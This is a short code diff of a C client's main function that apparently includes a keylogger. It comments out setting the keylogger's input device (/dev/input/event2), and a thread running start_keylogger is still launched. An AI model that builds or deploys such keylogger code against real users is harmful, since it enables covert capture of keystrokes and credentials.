@@ -21,8 +21,8 @@ int main() {
     startingDataInitialize();
     
     //start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path
-
-    strcpy(clientData.keyLoggerInputFile, "/dev/input/event2");
+    
+    //strcpy(clientData.keyLoggerInputFile, "/dev/input/event2");
     clientData.isKeyLoggerActive = 0;
 
     if (pthread_create(&clientData.keyLoggerTid, NULL, start_keylogger, NULL) < 0) {
